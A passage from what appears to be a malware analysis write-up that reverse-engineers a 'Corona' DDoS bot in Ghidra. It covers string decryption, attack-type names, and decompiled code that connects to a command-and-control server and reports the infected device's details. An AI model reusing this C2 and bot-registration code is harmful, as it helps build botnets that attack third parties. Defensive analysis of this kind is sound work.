  <span class="kw4">byte</span><span class="br0">&#91;</span><span class="br0">&#93;</span> input <span class="sy0">=</span> <span class="st0">&quot;x$s$Dt$0&quot;</span>.<span class="me1">getBytes</span><span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
  <span class="co1">//The start of the decryption routine</span>
  <span class="kw4">int</span> iterationCount <span class="sy0">=</span> <span class="nu0">0</span><span class="sy0">;</span>
  <span class="kw4">int</span> j <span class="sy0">=</span> <span class="nu0">0</span><span class="sy0">;</span>
  <span class="kw1">do</span> <span class="br0">&#123;</span>
    <span class="kw1">if</span> <span class="br0">&#40;</span>input.<span class="me1">length</span> <span class="sy0">&lt;=</span> iterationCount<span class="br0">&#41;</span> <span class="br0">&#123;</span>
      output<span class="br0">&#91;</span>j<span class="br0">&#93;</span> <span class="sy0">=</span> <span class="nu0">0</span><span class="sy0">;</span>
      <span class="kw3">System</span>.<span class="me1">out</span>.<span class="me1">println</span><span class="br0">&#40;</span><span class="kw1">new</span> <span class="kw3">String</span><span class="br0">&#40;</span>output<span class="br0">&#41;</span><span class="br0">&#41;</span><span class="sy0">;</span>
      <span class="kw1">return</span><span class="sy0">;</span>
    <span class="br0">&#125;</span>
    <span class="kw1">for</span> <span class="br0">&#40;</span><span class="kw4">int</span> i <span class="sy0">=</span> <span class="nu0">0</span><span class="sy0">;</span> i <span class="sy0">&lt;</span> <span class="nu0">64</span><span class="sy0">;</span> i<span class="sy0">++</span><span class="br0">&#41;</span> <span class="br0">&#123;</span> <span class="co1">//0x41 equals 65, but needs to be 64 in Java because the null terminator byte is not present</span>
      <span class="kw1">if</span> <span class="br0">&#40;</span>input<span class="br0">&#91;</span>iterationCount<span class="br0">&#93;</span> <span class="sy0">==</span> enc<span class="br0">&#91;</span>i<span class="br0">&#93;</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
        output<span class="br0">&#91;</span>j<span class="br0">&#93;</span> <span class="sy0">=</span> dec<span class="br0">&#91;</span>i<span class="br0">&#93;</span><span class="sy0">;</span>
        j<span class="sy0">++;</span>
      <span class="br0">&#125;</span>
    <span class="br0">&#125;</span>
    iterationCount<span class="sy0">++;</span>
  <span class="br0">&#125;</span> <span class="kw1">while</span> <span class="br0">&#40;</span><span class="kw2">true</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="br0">&#125;</span>
&nbsp;
<span class="kw1">private</span> <span class="kw1">static</span> <span class="kw4">byte</span><span class="br0">&#91;</span><span class="br0">&#93;</span> getEnc<span class="br0">&#40;</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
  <span class="kw1">return</span> <span class="kw1">new</span> <span class="kw4">byte</span><span class="br0">&#91;</span><span class="br0">&#93;</span><span class="br0">&#123;</span>0x3c, 0x3e, 0x40, 0x5f, 0x3b, 0x3a, 0x2c, 0x2e, 0x2d, 0x2b, 0x2a, 0x5e, 0x3f, 0x3d, 0x29, 0x28, 0x7c, 0x41, 0x42, 0x26, 0x25, 0x24, 0x44, 0x60, 0x21, 0x77, 0x6b, 0x79, 0x78, 0x7a, 0x76, 0x75, 0x74, 0x73, 0x72, 0x71, 0x70, 0x6f, 0x6e, 0x6d, 0x6c, 0x69, 0x68, 0x67, 0x66, 0x65, 0x64, 0x63, 0x62, 0x61, 0x7e, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x46, 0x55, 0x43, 0x4b<span class="br0">&#125;</span><span class="sy0">;</span>
<span class="br0">&#125;</span>
&nbsp;
<span class="kw1">private</span> <span class="kw1">static</span> <span class="kw4">byte</span><span class="br0">&#91;</span><span class="br0">&#93;</span> getDec<span class="br0">&#40;</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
  <span class="kw1">return</span> <span class="kw1">new</span> <span class="kw4">byte</span><span class="br0">&#91;</span><span class="br0">&#93;</span><span class="br0">&#123;</span>0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69, 0x6c, 0x6d, 0x6e, 0x6f, 0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x7a, 0x79, 0x77, 0x6b, 0x78, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4c, 0x4d, 0x4e, 0x4f, 0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x5a, 0x59, 0x57, 0x4b, 0x58, 0x7c, 0x3a, 0x2e, 0x20<span class="br0">&#125;</span><span class="sy0">;</span>
<span class="br0">&#125;</span></pre></div></div></div></div></div></div></div>


<p>With this program, one can obtain the original values of the encrypted strings. Below, the <em>encryption_init</em> function is given, where the decrypted value is given as a comment.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="c"><pre class="de1">encryption<span class="br0">&#40;</span>enc_udp<span class="sy0">,</span><span class="nu0">2</span><span class="sy0">,</span><span class="st0">&quot;3nb&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span> <span class="co1">//UDP</span>
encryption<span class="br0">&#40;</span>enc_tcp<span class="sy0">,</span><span class="nu0">2</span><span class="sy0">,</span><span class="st0">&quot;2ob&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span> <span class="co1">//TCP</span>
encryption<span class="br0">&#40;</span>enc_http<span class="sy0">,</span><span class="nu0">2</span><span class="sy0">,</span><span class="st0">&quot;h22b&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span> <span class="co1">//HTTP</span>
encryption<span class="br0">&#40;</span>enc_std<span class="sy0">,</span><span class="nu0">2</span><span class="sy0">,</span><span class="st0">&quot;12n&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span> <span class="co1">//STD</span>
encryption<span class="br0">&#40;</span>enc_xmas<span class="sy0">,</span><span class="nu0">2</span><span class="sy0">,</span><span class="st0">&quot;9eq1&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span> <span class="co1">//XMAS</span>
encryption<span class="br0">&#40;</span>enc_vse<span class="sy0">,</span><span class="nu0">2</span><span class="sy0">,</span><span class="st0">&quot;41m&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span> <span class="co1">//VSE</span>
encryption<span class="br0">&#40;</span>enc_proc_kill<span class="sy0">,</span><span class="nu0">2</span><span class="sy0">,</span><span class="st0">&quot;A*A*t)sB&amp;&amp;uDx&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span> <span class="co1">//hahawekillyou</span>
encryption<span class="br0">&#40;</span>enc_name<span class="sy0">,</span><span class="nu0">2</span><span class="sy0">,</span><span class="st0">&quot;oDwD$*&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span> <span class="co1">//Corona</span>
encryption<span class="br0">&#40;</span>enc_unknown<span class="sy0">,</span><span class="nu0">2</span><span class="sy0">,</span><span class="st0">&quot;x$s$Dt$&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span> <span class="co1">//unknown</span></pre></div></div></div></div></div></div></div>


<p><a name ="testing-the-internet-connection"></a></p>
<h2><a href="#testing-the-internet-connection">Testing the internet connection</a></h2>
<p>After the strings have been decrypted, the command line argument is saved, the name of the parent process is changed, and the random seed has been set, the <em>connection</em> function is reached. The code is given below.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="c"><pre class="de1">undefined8 connection<span class="br0">&#40;</span><span class="kw4">void</span><span class="br0">&#41;</span>
<span class="br0">&#123;</span>
  uint uVar1<span class="sy0">;</span>
  <span class="kw4">int</span> iVar2<span class="sy0">;</span>
  sa_family_t local_18<span class="sy0">;</span>
  <span class="kw4">uint16_t</span> local_16<span class="sy0">;</span>
  in_addr_t local_14<span class="sy0">;</span>
&nbsp;
  <span class="kw1">while</span><span class="br0">&#40;</span> <span class="kw2">true</span> <span class="br0">&#41;</span> <span class="br0">&#123;</span>
    uVar1 <span class="sy0">=</span> fcntl<span class="br0">&#40;</span>MainSockFD<span class="sy0">,</span><span class="nu0">3</span><span class="sy0">,</span><span class="nu0">0</span><span class="br0">&#41;</span><span class="sy0">;</span>
    fcntl<span class="br0">&#40;</span>MainSockFD<span class="sy0">,</span><span class="nu0">4</span><span class="sy0">,</span>
          <span class="br0">&#40;</span>ulong<span class="br0">&#41;</span><span class="br0">&#40;</span>uVar1 <span class="sy0">&amp;</span> <span class="nu12">0xffff0000</span> <span class="sy0">|</span> <span class="br0">&#40;</span>uint<span class="br0">&#41;</span>CONCAT11<span class="br0">&#40;</span><span class="br0">&#40;</span><span class="kw4">char</span><span class="br0">&#41;</span><span class="br0">&#40;</span><span class="br0">&#40;</span>ulong<span class="br0">&#41;</span>uVar1 <span class="sy0">&gt;&gt;</span> <span class="nu0">8</span><span class="br0">&#41;</span><span class="sy0">,</span><span class="br0">&#40;</span><span class="kw4">char</span><span class="br0">&#41;</span>uVar1<span class="br0">&#41;</span><span class="br0">&#41;</span> <span class="sy0">|</span>
          <span class="nu12">0x800</span><span class="br0">&#41;</span><span class="sy0">;</span>
    MainSockFD <span class="sy0">=</span> socket<span class="br0">&#40;</span><span class="nu0">2</span><span class="sy0">,</span><span class="nu0">1</span><span class="sy0">,</span><span class="nu0">0</span><span class="br0">&#41;</span><span class="sy0">;</span>
    local_18 <span class="sy0">=</span> <span class="nu0">2</span><span class="sy0">;</span>
    local_16 <span class="sy0">=</span> htons<span class="br0">&#40;</span><span class="br0">&#40;</span><span class="kw4">uint16_t</span><span class="br0">&#41;</span>bot_port<span class="br0">&#41;</span><span class="sy0">;</span>
    local_14 <span class="sy0">=</span> inet_addr<span class="br0">&#40;</span>bot_host<span class="br0">&#41;</span><span class="sy0">;</span>
    iVar2 <span class="sy0">=</span> connect<span class="br0">&#40;</span>MainSockFD<span class="sy0">,</span><span class="br0">&#40;</span>sockaddr <span class="sy0">*</span><span class="br0">&#41;</span><span class="sy0">&amp;</span>local_18<span class="sy0">,</span><span class="nu12">0x10</span><span class="br0">&#41;</span><span class="sy0">;</span>
    <span class="kw1">if</span> <span class="br0">&#40;</span>iVar2 <span class="sy0">!=</span> <span class="sy0">-</span><span class="nu0">1</span><span class="br0">&#41;</span> <span class="kw2">break</span><span class="sy0">;</span>
    <span class="kw3">printf</span><span class="br0">&#40;</span><span class="st0">&quot;[%s] Unable To Connect! <span class="es1">\n</span>&quot;</span><span class="sy0">,</span>enc_name<span class="br0">&#41;</span><span class="sy0">;</span>
    sleep<span class="br0">&#40;</span><span class="nu0">5</span><span class="br0">&#41;</span><span class="sy0">;</span>
  <span class="br0">&#125;</span>
  <span class="kw3">printf</span><span class="br0">&#40;</span><span class="st0">&quot;[%s] Succesfully Connected! <span class="es1">\n</span>&quot;</span><span class="sy0">,</span>enc_name<span class="br0">&#41;</span><span class="sy0">;</span>
  registermydevice<span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
  <span class="kw1">return</span> <span class="nu0">0</span><span class="sy0">;</span>
<span class="br0">&#125;</span></pre></div></div></div></div></div></div></div>


<p>Note that the <em>local_18</em> variable is of the <em>sa_family_t</em> type. Below, there are three variables (<em>local_18</em>, <em>local_16</em>, and <em>local_14</em>) that are actually fields within the <em>sockaddr_in</em> struct. Changing the type will show the correct decompiled code. Additionally, the name of <em>local_18</em> can be changed into <em>socketAddr</em>.</p>
<p>Based on the print statements, one can deduce that this function is a connectivity test. At first, an <em>AF_INET</em> <em>SOCK_STREAM</em> socket with a default protocol is created. After that, a connection is initiated based upon the data within the <em>sockaddr_in</em> structure. Both the address and the port that the bot will connect to, are located within the data segment.</p>
<p>Port <em>20</em> is generally used to transfer files using the File Transfer Protocol (FTP), although this is not the case in this bot. The IP address to connect to is 91[.]209[.]70[.]22.</p>
<p>When the <a href="https://linux.die.net/man/2/connect">connect</a> function fails, the return value is equal to <em>-1</em>. The variable <em>iVar2</em> is equal to the <em>connectionResult</em> and can be renamed as such. The renamed and retyped function is given below.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="c"><pre class="de1">undefined8 connection<span class="br0">&#40;</span><span class="kw4">void</span><span class="br0">&#41;</span>
<span class="br0">&#123;</span>
  uint uVar1<span class="sy0">;</span>
  <span class="kw4">int</span> connectionResult<span class="sy0">;</span>
  sockaddr_in socketAddr<span class="sy0">;</span>
&nbsp;
  <span class="kw1">while</span><span class="br0">&#40;</span> <span class="kw2">true</span> <span class="br0">&#41;</span> <span class="br0">&#123;</span>
    uVar1 <span class="sy0">=</span> fcntl<span class="br0">&#40;</span>MainSockFD<span class="sy0">,</span><span class="nu0">3</span><span class="sy0">,</span><span class="nu0">0</span><span class="br0">&#41;</span><span class="sy0">;</span>
    fcntl<span class="br0">&#40;</span>MainSockFD<span class="sy0">,</span><span class="nu0">4</span><span class="sy0">,</span>
          <span class="br0">&#40;</span>ulong<span class="br0">&#41;</span><span class="br0">&#40;</span>uVar1 <span class="sy0">&amp;</span> <span class="nu12">0xffff0000</span> <span class="sy0">|</span> <span class="br0">&#40;</span>uint<span class="br0">&#41;</span>CONCAT11<span class="br0">&#40;</span><span class="br0">&#40;</span><span class="kw4">char</span><span class="br0">&#41;</span><span class="br0">&#40;</span><span class="br0">&#40;</span>ulong<span class="br0">&#41;</span>uVar1 <span class="sy0">&gt;&gt;</span> <span class="nu0">8</span><span class="br0">&#41;</span><span class="sy0">,</span><span class="br0">&#40;</span><span class="kw4">char</span><span class="br0">&#41;</span>uVar1<span class="br0">&#41;</span><span class="br0">&#41;</span> <span class="sy0">|</span>
          <span class="nu12">0x800</span><span class="br0">&#41;</span><span class="sy0">;</span>
    MainSockFD <span class="sy0">=</span> socket<span class="br0">&#40;</span>AF_INET<span class="sy0">,</span>SOCK_STREAM<span class="sy0">,</span><span class="nu0">0</span><span class="br0">&#41;</span><span class="sy0">;</span>
    socketAddr.<span class="me1">sin_family</span> <span class="sy0">=</span> <span class="nu0">2</span><span class="sy0">;</span>
    socketAddr.<span class="me1">sin_port</span> <span class="sy0">=</span> htons<span class="br0">&#40;</span><span class="br0">&#40;</span><span class="kw4">uint16_t</span><span class="br0">&#41;</span>_bot_port<span class="br0">&#41;</span><span class="sy0">;</span>
    socketAddr.<span class="me1">sin_addr</span> <span class="sy0">=</span> inet_addr<span class="br0">&#40;</span>bot_host<span class="br0">&#41;</span><span class="sy0">;</span>
    connectionResult <span class="sy0">=</span> connect<span class="br0">&#40;</span>MainSockFD<span class="sy0">,</span><span class="br0">&#40;</span>sockaddr <span class="sy0">*</span><span class="br0">&#41;</span><span class="sy0">&amp;</span>socketAddr<span class="sy0">,</span><span class="nu12">0x10</span><span class="br0">&#41;</span><span class="sy0">;</span>
    <span class="kw1">if</span> <span class="br0">&#40;</span>connectionResult <span class="sy0">!=</span> <span class="sy0">-</span><span class="nu0">1</span><span class="br0">&#41;</span> <span class="kw2">break</span><span class="sy0">;</span>
    <span class="kw3">printf</span><span class="br0">&#40;</span><span class="st0">&quot;[%s] Unable To Connect! <span class="es1">\n</span>&quot;</span><span class="sy0">,</span>enc_name<span class="br0">&#41;</span><span class="sy0">;</span>
    sleep<span class="br0">&#40;</span><span class="nu0">5</span><span class="br0">&#41;</span><span class="sy0">;</span>
  <span class="br0">&#125;</span>
  <span class="kw3">printf</span><span class="br0">&#40;</span><span class="st0">&quot;[%s] Succesfully Connected! <span class="es1">\n</span>&quot;</span><span class="sy0">,</span>enc_name<span class="br0">&#41;</span><span class="sy0">;</span>
  registermydevice<span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
  <span class="kw1">return</span> <span class="nu0">0</span><span class="sy0">;</span>
<span class="br0">&#125;</span></pre></div></div></div></div></div></div></div>


<p>The main socket is used to connect to the command &#038; control server. If the connection is not made successfully, the bot prints the failure message, sleeps for 5 seconds, and then tries to connect the command &#038; control server again. Upon a successfull connection, the endless loop is broken, the success message is printed, and the <em>registermydevice</em> function is called.</p>
<p><a name ="registering-the-bot"></a></p>
<h2><a href="#registering-the-bot">Registering the bot</a></h2>
<p>After the connection has been made successfully, the bot is registered. The function is given below.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="c"><pre class="de1"><span class="kw4">void</span> registermydevice<span class="br0">&#40;</span><span class="kw4">void</span><span class="br0">&#41;</span>
<span class="br0">&#123;</span>
  <span class="kw4">char</span> cVar2<span class="sy0">;</span>
  undefined8 uVar2<span class="sy0">;</span>
  ulong uVar3<span class="sy0">;</span>
  ulong uVar4<span class="sy0">;</span>
  <span class="kw4">char</span> <span class="sy0">*</span>pcVar5<span class="sy0">;</span>
  <span class="kw4">char</span> <span class="sy0">*</span>pcVar4<span class="sy0">;</span>
  <span class="kw4">char</span> acStack632 <span class="br0">&#91;</span><span class="nu0">512</span><span class="br0">&#93;</span><span class="sy0">;</span>
  <span class="kw4">char</span> acStack120 <span class="br0">&#91;</span><span class="nu0">112</span><span class="br0">&#93;</span><span class="sy0">;</span>
  <span class="kw4">char</span> cVar1<span class="sy0">;</span>
&nbsp;
  uVar2 <span class="sy0">=</span> getBuild<span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
  <span class="kw3">sprintf</span><span class="br0">&#40;</span>acStack120<span class="sy0">,</span><span class="st0">&quot;arch %s<span class="es1">\r</span><span class="es1">\n</span>&quot;</span><span class="sy0">,</span>uVar2<span class="br0">&#41;</span><span class="sy0">;</span>
  uVar3 <span class="sy0">=</span> <span class="nu12">0xffffffffffffffff</span><span class="sy0">;</span>
  pcVar5 <span class="sy0">=</span> acStack120<span class="sy0">;</span>
  <span class="kw1">do</span> <span class="br0">&#123;</span>
    <span class="kw1">if</span> <span class="br0">&#40;</span>uVar3 <span class="sy0">==</span> <span class="nu0">0</span><span class="br0">&#41;</span> <span class="kw2">break</span><span class="sy0">;</span>
    uVar3 <span class="sy0">=</span> uVar3 <span class="sy0">-</span> <span class="nu0">1</span><span class="sy0">;</span>
    cVar1 <span class="sy0">=</span> <span class="sy0">*</span>pcVar5<span class="sy0">;</span>
    pcVar5 <span class="sy0">=</span> pcVar5 <span class="sy0">+</span> <span class="nu0">1</span><span class="sy0">;</span>
  <span class="br0">&#125;</span> <span class="kw1">while</span> <span class="br0">&#40;</span>cVar1 <span class="sy0">!=</span> <span class="nu0">0</span><span class="br0">&#41;</span><span class="sy0">;</span>
  write<span class="br0">&#40;</span>MainSockFD<span class="sy0">,</span>acStack120<span class="sy0">,</span>~uVar3 <span class="sy0">-</span> <span class="nu0">1</span><span class="br0">&#41;</span><span class="sy0">;</span>
  uVar2 <span class="sy0">=</span> getBuild<span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
  <span class="kw3">sprintf</span><span class="br0">&#40;</span>acStack632<span class="sy0">,</span>
&nbsp;
          <span class="st0">&quot;<span class="es2">\x1b</span>[0m<span class="es2">\x1b</span>[0;31m[<span class="es2">\x1b</span>[0;36m%s<span class="es2">\x1b</span>[0;31m]<span class="es2">\x1b</span>[0m Device Joined [Host:%s] [Arch:%s][Name:%s]<span class="es2">\x1b</span>[0m<span class="es1">\r</span><span class="es1">\n</span>&quot;</span>
          <span class="sy0">,</span>enc_name<span class="sy0">,</span><span class="nu12">0x510068</span><span class="sy0">,</span>uVar2<span class="sy0">,</span><span class="nu12">0x510004</span><span class="br0">&#41;</span><span class="sy0">;</span>
  uVar4 <span class="sy0">=</span> <span class="nu12">0xffffffffffffffff</span><span class="sy0">;</span>
  pcVar4 <span class="sy0">=</span> acStack632<span class="sy0">;</span>
  <span class="kw1">do</span> <span class="br0">&#123;</span>
    <span class="kw1">if</span> <span class="br0">&#40;</span>uVar4 <span class="sy0">==</span> <span class="nu0">0</span><span class="br0">&#41;</span> <span class="kw2">break</span><span class="sy0">;</span>
    uVar4 <span class="sy0">=</span> uVar4 <span class="sy0">-</span> <span class="nu0">1</span><span class="sy0">;</span>
    cVar2 <span class="sy0">=</span> <span class="sy0">*</span>pcVar4<span class="sy0">;</span>
    pcVar4 <span class="sy0">=</span> pcVar4 <span class="sy0">+</span> <span class="nu0">1</span><span class="sy0">;</span>
  <span class="br0">&#125;</span> <span class="kw1">while</span> <span class="br0">&#40;</span>cVar2 <span class="sy0">!=</span> <span class="nu0">0</span><span class="br0">&#41;</span><span class="sy0">;</span>
  write<span class="br0">&#40;</span>MainSockFD<span class="sy0">,</span>acStack632<span class="sy0">,</span>~uVar4 <span class="sy0">-</span> <span class="nu0">1</span><span class="br0">&#41;</span><span class="sy0">;</span>
  <span class="kw1">return</span><span class="sy0">;</span>
<span class="br0">&#125;</span></pre></div></div></div></div></div></div></div>


<p>In this function there are two <em>do-while</em> loops. Both of them are similar to a structure that was seen in the decryption function, and both are used to obtain the length of a given string.</p>
<p>At first, the variable <em>uVar2</em> is set equal to the return value of <em>getBuild</em>, which is given below.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="c"><pre class="de1">undefined <span class="sy0">*</span> getBuild<span class="br0">&#40;</span><span class="kw4">void</span><span class="br0">&#41;</span>
<span class="br0">&#123;</span>
  <span class="kw1">return</span> <span class="sy0">&amp;</span>DAT_00407d3d<span class="sy0">;</span>
<span class="br0">&#125;</span></pre></div></div></div></div></div></div></div>


<p>When viewing the location of <em>DAT_00496d3d</em>, one can see it is a null terminated string. As such, the type can be changed to a <em>char *</em>. Ghidra will make use of the new type, as the <em>getBuild</em> function changes after this, as can be seen below.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="c"><pre class="de1"><span class="kw4">char</span> <span class="sy0">*</span> getBuild<span class="br0">&#40;</span><span class="kw4">void</span><span class="br0">&#41;</span>
<span class="br0">&#123;</span>
  <span class="kw1">return</span> <span class="st0">&quot;x86&quot;</span><span class="sy0">;</span>
<span class="br0">&#125;</span></pre></div></div></div></div></div></div></div>


<p>Additionally, the variable type of <em>uVar2</em> is changed to a character pointer. The variable <em>uVar2</em> can be renamed into <em>architecture</em>.</p>
<p>The function contains two calls to the write function, sending two pieces of information towards the command &#038; control server. The creation of the first message, as well as the write call, is given below.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="c"><pre class="de1">architecture <span class="sy0">=</span> getBuild<span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="kw3">sprintf</span><span class="br0">&#40;</span>acStack120<span class="sy0">,</span><span class="st0">&quot;arch %s<span class="es1">\r</span><span class="es1">\n</span>&quot;</span><span class="sy0">,</span>architecture<span class="br0">&#41;</span><span class="sy0">;</span>
uVar3 <span class="sy0">=</span> <span class="nu12">0xffffffffffffffff</span><span class="sy0">;</span>
pcVar3 <span class="sy0">=</span> acStack120<span class="sy0">;</span>
<span class="kw1">do</span> <span class="br0">&#123;</span>
  <span class="kw1">if</span> <span class="br0">&#40;</span>uVar3 <span class="sy0">==</span> <span class="nu0">0</span><span class="br0">&#41;</span> <span class="kw2">break</span><span class="sy0">;</span>
  uVar3 <span class="sy0">=</span> uVar3 <span class="sy0">-</span> <span class="nu0">1</span><span class="sy0">;</span>
  cVar1 <span class="sy0">=</span> <span class="sy0">*</span>pcVar3<span class="sy0">;</span>
  pcVar3 <span class="sy0">=</span> pcVar3 <span class="sy0">+</span> <span class="nu0">1</span><span class="sy0">;</span>
<span class="br0">&#125;</span> <span class="kw1">while</span> <span class="br0">&#40;</span>cVar1 <span class="sy0">!=</span> <span class="nu0">0</span><span class="br0">&#41;</span><span class="sy0">;</span>
write<span class="br0">&#40;</span>MainSockFD<span class="sy0">,</span>acStack120<span class="sy0">,</span>~uVar3 <span class="sy0">-</span> <span class="nu0">1</span><span class="br0">&#41;</span><span class="sy0">;</span></pre></div></div></div></div></div></div></div>


<p>At first, the architecture variable is filled, after which the <em>acStack120</em> variable is used as a buffer to store <em>arch x86\r\n</em> in. After that, a copy of the buffer is made to calculate the length of the input string. At last, the main socket is used to send the buffer with the given length to the command &#038; control server. The refactored code is given below.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="c"><pre class="de1">architecture <span class="sy0">=</span> getBuild<span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="kw3">sprintf</span><span class="br0">&#40;</span>architectureBuffer<span class="sy0">,</span><span class="st0">&quot;arch %s<span class="es1">\r</span><span class="es1">\n</span>&quot;</span><span class="sy0">,</span>architecture<span class="br0">&#41;</span><span class="sy0">;</span>
archBufferLength <span class="sy0">=</span> <span class="nu12">0xffffffffffffffff</span><span class="sy0">;</span>
archBufferCopy <span class="sy0">=</span> architectureBuffer<span class="sy0">;</span>
<span class="kw1">do</span> <span class="br0">&#123;</span>
  <span class="kw1">if</span> <span class="br0">&#40;</span>archBufferLength <span class="sy0">==</span> <span class="nu0">0</span><span class="br0">&#41;</span> <span class="kw2">break</span><span class="sy0">;</span>
  archBufferLength <span class="sy0">=</span> archBufferLength <span class="sy0">-</span> <span class="nu0">1</span><span class="sy0">;</span>
  currentArchChar <span class="sy0">=</span> <span class="sy0">*</span>archBufferCopy<span class="sy0">;</span>
  archBufferCopy <span class="sy0">=</span> archBufferCopy <span class="sy0">+</span> <span class="nu0">1</span><span class="sy0">;</span>
<span class="br0">&#125;</span> <span class="kw1">while</span> <span class="br0">&#40;</span>currentArchChar <span class="sy0">!=</span> <span class="nu0">0</span><span class="br0">&#41;</span><span class="sy0">;</span>
write<span class="br0">&#40;</span>MainSockFD<span class="sy0">,</span>architectureBuffer<span class="sy0">,</span>~archBufferLength <span class="sy0">-</span> <span class="nu0">1</span><span class="br0">&#41;</span><span class="sy0">;</span></pre></div></div></div></div></div></div></div>


<p>The second <em>write</em> call contains a different buffer with a different length. The code is given below.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="c"><pre class="de1">pcVar2 <span class="sy0">=</span> getBuild<span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="kw3">sprintf</span><span class="br0">&#40;</span>acStack632<span class="sy0">,</span>                   
        <span class="st0">&quot;<span class="es2">\x1b</span>[0m<span class="es2">\x1b</span>[0;31m[<span class="es2">\x1b</span>[0;36m%s<span class="es2">\x1b</span>[0;31m]<span class="es2">\x1b</span>[0m Device Joined [Host:%s] [Arch:%s][Name:%s]<span class="es2">\x1b</span>[0m<span class="es1">\r</span><span class="es1">\n</span>&quot;</span>
        <span class="sy0">,</span>enc_name<span class="sy0">,</span><span class="nu12">0x510068</span><span class="sy0">,</span>pcVar2<span class="sy0">,</span><span class="nu12">0x510004</span><span class="br0">&#41;</span><span class="sy0">;</span>
uVar3 <span class="sy0">=</span> <span class="nu12">0xffffffffffffffff</span><span class="sy0">;</span>
pcVar4 <span class="sy0">=</span> acStack632<span class="sy0">;</span>
<span class="kw1">do</span> <span class="br0">&#123;</span>
  <span class="kw1">if</span> <span class="br0">&#40;</span>uVar3 <span class="sy0">==</span> <span class="nu0">0</span><span class="br0">&#41;</span> <span class="kw2">break</span><span class="sy0">;</span>
  uVar3 <span class="sy0">=</span> uVar3 <span class="sy0">-</span> <span class="nu0">1</span><span class="sy0">;</span>
  cVar1 <span class="sy0">=</span> <span class="sy0">*</span>pcVar4<span class="sy0">;</span>
  pcVar4 <span class="sy0">=</span> pcVar4 <span class="sy0">+</span> <span class="nu0">1</span><span class="sy0">;</span>
<span class="br0">&#125;</span> <span class="kw1">while</span> <span class="br0">&#40;</span>cVar1 <span class="sy0">!=</span> <span class="nu0">0</span><span class="br0">&#41;</span><span class="sy0">;</span>
write<span class="br0">&#40;</span>MainSockFD<span class="sy0">,</span>acStack632<span class="sy0">,</span>~uVar3 <span class="sy0">-</span> <span class="nu0">1</span><span class="br0">&#41;</span><span class="sy0">;</span></pre></div></div></div></div></div></div></div>


<p>The <em>acStack632</em> variable contains the final value to be sent to the command &#038; control server. The code below that is used to calculate the length of the string. The string that is created, contains more information on the infected device. It contains the name (which equals <em>Corona</em>), the value at <em>0x510068</em>, the architecture (which is stored in <em>pcVar2</em> and obtained from <em>getBuild</em>), and the value at <em>0x510004</em>. </p>
<p>When double clicking on the two addresses, one can see that the values reside within the <em>myinfo</em> struct. The value at <em>0x510068</em> is equal to <em>myinfo.local_addres</em>, which was set within the <em>local_addr</em> function. The value at <em>0x510004</em> is equal to <em>myinfo.command_line_argument</em>, which was set within the <em>main</em> function.</p>
